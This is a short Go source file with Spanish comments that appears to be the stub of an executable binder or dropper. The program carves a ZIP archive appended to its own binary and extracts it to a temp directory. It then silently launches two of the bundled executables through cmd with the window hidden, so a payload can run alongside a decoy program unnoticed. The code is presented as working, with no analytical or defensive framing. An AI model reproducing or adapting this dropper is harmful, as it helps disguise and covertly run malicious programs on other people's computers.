package main
//Modulos
import (
"archive/zip"
"io/ioutil"
"os"
"strings"
"encoding/hex"
"io"
"os/exec"
"syscall"
)


func main(){
    name:=os.Args[0]
    exe,err:=ioutil.ReadFile(name)
    if err!= nil{
    	os.Exit(1)
    }
    filezip,err:=ioutil.TempFile("","")
    
    if err !=nil{
    	os.Exit(1)
    }
    cabecera,_:=hex.DecodeString("504B030414")
    posicion:=strings.Index(string(exe),string(cabecera))
    filezip.WriteString(string(exe[posicion:]))
    filezip.Close()
    //Dir Temporal Para Archivos
    tempdir,_:=ioutil.TempDir("","")
    
	zip_extract,_:=zip.OpenReader(filezip.Name())
	for _,file :=range zip_extract.Reader.File{
		filereader,err:=file.Open()
        path:=tempdir+"\\"+file.Name
		if err !=nil{
			os.Exit(1)
		}
		defer filereader.Close()
	    filetarget,err:=os.OpenFile(path,os.O_WRONLY|os.O_CREATE|os.O_TRUNC,file.Mode())
	    if err != nil{
	    	os.Exit(1)
	    }

	    io.Copy(filetarget,filereader)     
	}
    //Obtener nombres de los exe
	name_files,err:=ioutil.ReadFile(tempdir+"\\name.txt")
	if err != nil{
		os.Exit(1)
	}
    name_list:=strings.Split(string(name_files),"\n")

    //EJECUTAR ARCHIVOS EXE
	cmd:=exec.Command("cmd","/c",tempdir+"\\"+name_list[0]+"  |  "+tempdir+"\\"+name_list[1])
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow:true}
	cmd.Start()
	
}